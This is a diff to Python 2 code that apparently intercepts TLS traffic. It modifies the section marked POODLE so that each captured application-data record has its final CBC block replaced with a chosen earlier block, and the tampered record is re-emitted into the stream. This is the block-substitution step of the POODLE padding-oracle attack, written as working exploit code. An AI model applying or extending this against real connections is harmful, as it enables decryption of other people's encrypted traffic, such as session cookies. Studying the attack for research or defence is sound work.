@@ -28,16 +28,20 @@ while l:
 			data = encoded_data.decode("base64")
 			tls_record = TLSRecord(data)
 			if tls_record.content_type == TLS_CONTENT_TYPE_APPLICATION_DATA:
+				encrypted_blocks = tls_record.length / BLOCK_LENGTH
 				if len(tls_record.load) > tls_record.length:
 					load_excess = tls_record.load[tls_record.length:]
 					tls_record.load = tls_record.load[:tls_record.length]
-					tls_record = tls_record/TLSRecord(load_excess)
+					second_tls_record = TLSRecord(load_excess)
+					tls_record = tls_record/second_tls_record
+					encrypted_blocks = second_tls_record.length / BLOCK_LENGTH
+				#print encrypted_blocks
 				#print origin, tls_record.show()
 				# <POODLE>
-				data_minus_last_block, last_block = data[:-BLOCK_LENGTH], data[-BLOCK_LENGTH:]
-				data_minus_second_to_last_block, second_to_last_block = data_minus_last_block[:-BLOCK_LENGTH], data_minus_last_block[-BLOCK_LENGTH:]
-				data = data_minus_second_to_last_block + last_block + second_to_last_block
-				#l = origin + ORIGIN_SEPARATOR + data.encode("base64").replace("\n", "") + "\n"
+				data_minus_last_block = data[:-BLOCK_LENGTH]
+				first_block = data[-BLOCK_LENGTH*encrypted_blocks:-BLOCK_LENGTH*(encrypted_blocks-1)]
+				data = data_minus_last_block + first_block
+				l = origin + ORIGIN_SEPARATOR + data.encode("base64").replace("\n", "") + "\n"
 				# </POODLE>
 				#tls_record = TLSRecord(data)
 				#load_excess = tls_record.load[tls_record.length:]
